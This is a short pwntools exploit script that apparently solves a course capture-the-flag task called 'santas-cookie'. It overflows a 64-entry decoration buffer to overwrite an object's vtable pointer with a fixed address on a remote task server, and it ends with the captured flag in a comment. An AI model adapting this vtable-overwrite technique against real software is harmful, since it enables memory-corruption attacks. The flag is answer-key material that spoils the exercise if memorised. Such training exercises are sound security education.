from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b main
b make_festive
#getline
#b *$base("vuln")+0x17cf
#check input i
#b *$base("vuln")+0x185d
# inside check 2
#b *$base("vuln")+0x136e
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33049)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/santas-cookie") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(6)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


# SantaSpecialCookie vtable = 0x00403db0
SantaSpecialCookie = 0x00403db0
# Cookie vtable = 00403db8

MAX_DECORATIONS = 64

p.recvuntil(b"Cookie decoration > ")
p.send(cyclic(MAX_DECORATIONS)+p64(SantaSpecialCookie))

p.interactive()

#softsec{loKfFeJZfCWJeB0LBcJzzlvqliMJKiy58-RSNTfiJJLGrtm_h0ajNy0dW1L96A-G}